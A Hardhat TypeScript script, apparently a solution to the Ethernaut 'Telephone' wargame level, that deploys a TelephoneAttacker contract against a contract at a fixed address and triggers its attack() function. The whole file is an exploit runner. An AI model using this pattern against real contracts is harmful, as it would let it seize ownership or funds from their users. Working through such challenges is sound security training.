import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'Telephone';
const ATTACKER_NAME = 'TelephoneAttacker';
const CONTRACT_ADDRESS = '0x3767acf4B8a5C749191EFAb7934104eB78b4da62';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(6);
  console.log('Attacker Contract deployed to:', attackerContract.address);
  console.log(`Performing attack...`);
  tx = await attackerContract.attack();
  await tx.wait(2);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
